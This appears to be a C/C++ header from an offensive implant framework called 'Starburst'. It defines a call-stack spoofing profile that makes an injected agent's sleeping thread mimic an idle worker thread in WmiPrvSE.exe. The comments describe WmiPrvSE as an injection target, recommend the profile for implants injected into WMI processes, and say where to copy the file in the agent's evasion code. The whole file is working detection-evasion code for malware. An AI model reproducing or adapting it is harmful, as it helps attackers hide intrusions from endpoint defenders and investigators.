/*
 * Starburst Sleep Mask Kit - WMI Provider Host Profile (3-frame)
 *
 * Mimics the idle call stack of a worker thread inside WmiPrvSE.exe,
 * the WMI Provider Host process. WmiPrvSE.exe hosts out-of-process
 * WMI providers and is a common injection target due to its persistent
 * presence on Windows systems and its expected network/system activity.
 *
 * WmiPrvSE worker threads use the NT thread pool internally, so their
 * idle stacks show TppWorkerThread as the inner frame rather than a
 * WMI-specific function. This makes the pattern identical to a generic
 * thread pool worker but with BaseThreadInitThunk in the chain,
 * matching the specific stack shape observed in WmiPrvSE processes.
 *
 * Spoofed stack (as seen by a debugger, top = innermost):
 *
 *   ntdll!TppWorkerThread+0x2f
 *   kernel32!BaseThreadInitThunk+0x14
 *   ntdll!RtlUserThreadStart+0x21
 *
 * Where you would see this pattern:
 *   - WmiPrvSE.exe (WMI Provider Host)
 *   - Other processes using thread pool workers via kernel32 thread creation
 *   - svchost.exe instances that create thread pool workers through
 *     BaseThreadInitThunk rather than directly via ntdll
 *   - Good choice when injected into WMI-related processes
 *
 * Usage: Copy this file to agent_code/include/evasion/spoof_profiles.h
 */

#ifndef STARBURST_EVASION_SPOOF_PROFILES_H
#define STARBURST_EVASION_SPOOF_PROFILES_H

#include <constexpr.h>
#include <stdint.h>

#define SPOOF_MAX_FRAMES 10

struct SPOOF_FRAME_DEF {
    uint32_t module_hash;
    uint32_t func_hash;
    uint32_t offset;
};

static inline void populate_spoof_frames(
    SPOOF_FRAME_DEF* frames, uint32_t* count
) {
    uint32_t i = 0;

    /*
     * Frame 0 (innermost): ntdll!TppWorkerThread+0x2f
     *
     * WmiPrvSE worker threads use the NT thread pool. When idle and
     * waiting for WMI query requests, the thread blocks inside the
     * TppWorkerThread loop. The +0x2f offset is the return address
     * after the internal wait call.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "TppWorkerThread" );
    frames[i].offset      = 0x2f;
    i++;

    /*
     * Frame 1: kernel32!BaseThreadInitThunk+0x14
     *
     * In WmiPrvSE, thread pool workers are dispatched through the
     * kernel32 thread initialization path. This distinguishes the
     * WmiPrvSE pattern from the simpler 2-frame worker profile
     * (worker_2frame.h) which goes directly from TppWorkerThread
     * to RtlUserThreadStart.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"kernel32.dll" );
    frames[i].func_hash   = expr::hash_string( "BaseThreadInitThunk" );
    frames[i].offset      = 0x14;
    i++;

    /*
     * Frame 2 (outermost): ntdll!RtlUserThreadStart+0x21
     *
     * Thread entry point at the bottom of the stack.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "RtlUserThreadStart" );
    frames[i].offset      = 0x21;
    i++;

    *count = i;
}

#endif /* STARBURST_EVASION_SPOOF_PROFILES_H */
